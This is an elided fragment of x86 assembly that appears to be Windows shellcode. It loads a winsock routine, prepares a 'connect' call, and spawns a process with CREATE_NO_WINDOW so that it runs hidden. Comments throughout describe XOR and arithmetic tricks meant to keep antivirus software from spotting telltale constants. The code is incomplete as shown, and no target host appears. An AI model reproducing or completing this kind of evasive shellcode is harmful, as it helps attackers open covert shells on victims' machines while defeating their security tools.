...
push esp
call myws32
;avoid AV storing the value 0x0c000000 using xor eax value
mov [ecx+0x24], eax
xor eax,ecx
mov [ecx+0x28], eax
...
push ebx
push esi
;restauring value of connect to avoid AV with 0xC xor 0x4 = 0x8 and 0xC-0x4=0x8
lea eax,[eax-0x04000000]
...
push eax
push eax
;avoid AV to get the value 0x0c000000 previously xored with the value of connect function
xor eax,eax
mov eax,0x0c000028
mov eax,[eax]
xor ecx,ecx
...
xor eax,ecx
push eax
;avoid AV from 0x0c to 0x08 to call the process with ;CREATE_NO_WINDOW = 0x08000000
xor byte [esp+0x3],0x4
xor eax,eax
inc eax
push eax
dec eax
